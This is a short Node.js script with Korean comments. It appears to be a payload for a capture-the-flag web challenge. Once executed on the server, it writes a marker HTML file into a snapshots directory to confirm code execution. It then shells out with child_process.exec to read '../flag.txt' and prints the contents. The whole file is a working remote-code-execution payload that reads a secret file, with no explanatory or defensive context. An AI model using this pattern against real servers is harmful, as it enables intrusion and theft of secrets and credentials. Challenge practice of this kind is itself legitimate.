(() => {
  try {
    const fs = require("fs");
    const path = require("path");
        // /app/snapshots 로 추정되는 위치
    const snapshotsDir = __dirname;

    // 고정된 snapshot id로 html 생성 → 브라우저로 바로 확인 가능
    const markerId = "deadbeefdeadbeef";
    const outPath = path.join(snapshotsDir, `${markerId}.html`);
    fs.writeFileSync(outPath, "MARKER_OK", "utf8");
    const { exec } = require('child_process');
    
    exec('cat ../flag.txt', (error, stdout, stderr) => {
      if (error) {
        console.error(`error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`현재 경로:\n${stdout}`);
    });

    console.log("[waywayback hellow] marker html written");
  } catch (e) {
    try { console.log("[waywayback] error:", String(e)); } catch (_) {}
  }
})();
